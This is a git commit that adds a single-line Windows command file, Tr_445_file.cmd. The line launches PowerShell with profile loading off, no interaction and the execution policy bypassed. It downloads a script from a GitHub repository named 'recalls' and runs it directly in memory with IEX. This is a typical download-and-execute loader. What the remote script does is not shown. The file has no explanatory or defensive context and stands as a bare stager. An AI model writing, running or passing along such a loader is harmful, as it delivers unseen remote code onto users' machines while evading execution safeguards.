d651ed027c213865c0c05c175c5d4a233c393a74
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2022-06-16 11:17:59 +0600

    Create Tr_445_file.cmd

---
+++ Tr_445_file.cmd
@@ -0,0 +1,1 @@
+start  powershell -nop  -noni -ep bypass -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/recalls/main/Tr_445_recall.ps1');"
